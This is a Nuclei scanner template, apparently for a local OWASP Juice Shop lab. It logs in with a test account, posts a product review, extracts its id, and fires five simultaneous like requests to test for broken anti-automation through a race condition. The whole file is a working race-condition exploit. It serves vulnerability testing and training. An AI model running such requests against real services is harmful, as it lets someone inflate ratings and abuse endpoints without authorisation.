id: multiple-likes-broken-anti-automation

info:
  name: multiple-likes
  author: your_name
  severity: info
  description: "Test for broken anti-automation on product reviews"

requests:
  - raw:
      - |
        POST /rest/user/login HTTP/1.1
        Host: 127.0.0.1:3000
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
        Accept: application/json, text/plain, */*
        Content-Type: application/json

        {"email":"trycyber@gmail.com","password":"trycyber"}

    extractors:
      - type: regex
        name: token
        internal: true
        group: 1
        regex:
          - '"token"\s*:\s*"([^"]+)"'

  - raw:
      - |
        PUT /rest/products/22/reviews HTTP/1.1
        Host: 127.0.0.1:3000
        Authorization: Bearer {{token}}
        Content-Type: application/json

        {"review":"This is a test"}

    matchers:
      - type: status
        status:
          - 201

  - raw:
      - |
        GET /rest/products/22/reviews HTTP/1.1
        Host: 127.0.0.1:3000
        Authorization: Bearer {{token}}

    extractors:
      - type: regex
        name: id-value
        internal: true
        group: 1
        regex:
          - '"_id"\s*:\s*"([^"]+)"'

  - raw:
      - |
        POST /rest/products/reviews HTTP/1.1
        Host: 127.0.0.1:3000  
        Authorization: Bearer {{token}}
        Content-Type: application/json

        {"id":"{{id-value}}"}

    race: true
    race_count: 5
    
    
    matchers:
      - type: status
        status:
          - 200
   
    extractors:
      - type: regex
        name: count-like
        internal: true
        regex:
          - '"likesCount"\s*:\s*"([^"]+)"'

